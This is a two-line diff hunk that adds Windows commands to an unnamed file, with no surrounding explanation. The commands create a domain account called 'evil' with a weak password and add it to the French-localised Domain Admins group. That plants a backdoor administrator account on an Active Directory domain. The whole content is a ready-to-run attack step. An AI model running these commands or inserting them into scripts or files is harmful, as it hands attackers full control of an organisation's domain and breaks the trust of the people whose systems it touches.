@@ -1,0 +1,2 @@
+net user evil p4ssw0rd /add /domain
+net group “Admins du domaine” evil /add
